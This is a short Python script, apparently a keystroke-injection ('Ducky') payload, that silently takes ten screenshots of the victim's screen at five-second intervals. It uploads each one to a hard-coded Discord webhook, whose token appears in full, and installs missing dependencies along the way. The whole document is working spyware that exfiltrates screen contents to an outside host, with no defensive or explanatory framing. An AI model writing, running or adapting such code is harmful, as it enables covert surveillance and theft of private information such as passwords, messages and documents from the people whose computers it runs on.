import subprocess
import sys
import pyautogui
from time import sleep
import requests

# YOUR DISCORD WEBHOOK
discord_webhook = "https://discord.com/api/webhooks/1346209552860839987/g3dfx4FqXkbRjr1TbIJLj0LOUeMULIkvvoqbROuyDjVT0Fym6XfUiR4rhTfrjDuIMKLQ"

# Function to send a Discord alert
def send_discord_alert(message):
    data = {"content": message, "username": "AbhinavDucky"}
    response = requests.post(discord_webhook, json=data)
    if response.status_code == 200:
        print(f"Alert sent: {message}")
    else:
        print(f"Failed to send alert: {response.status_code}")

# Function to install required dependencies
def install_dependency(package):
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])
        send_discord_alert(f"✅ Successfully installed {package}.")
    except Exception as e:
        send_discord_alert(f"❌ Failed to install {package}: {str(e)}")

# List of required dependencies
required_packages = ["requests", "pyautogui"]

# Install missing dependencies
for package in required_packages:
    try:
        __import__(package)
    except ImportError:
        send_discord_alert(f"🔍 Installing missing dependency: {package}...")
        install_dependency(package)

# Screenshot Settings
SCREENSHOTS = 10
TIMING = 5

send_discord_alert("🚀 Script started. Taking screenshots...")

for i in range(SCREENSHOTS):
    sleep(TIMING)

    # Take the screenshot
    screenshot = pyautogui.screenshot()
    screenshot.save("screenshot.png")

    send_discord_alert(f"📸 Screenshot {i + 1} taken.")

    with open("screenshot.png", "rb") as f:
        foto = f.read()

    richiesta = {"username": "AbhinavDucky"}

    # Send the screenshot to Discord
    response = requests.post(discord_webhook, data=richiesta, files={f"Screen#{i + 1}.png": foto})

    # Debugging
    if response.status_code == 200:
        send_discord_alert(f"✅ Screenshot {i + 1} successfully sent!")
    else:
        send_discord_alert(f"❌ Error sending Screenshot {i + 1}. Status code: {response.status_code}")

send_discord_alert("🎉 All screenshots sent successfully! Script execution completed.")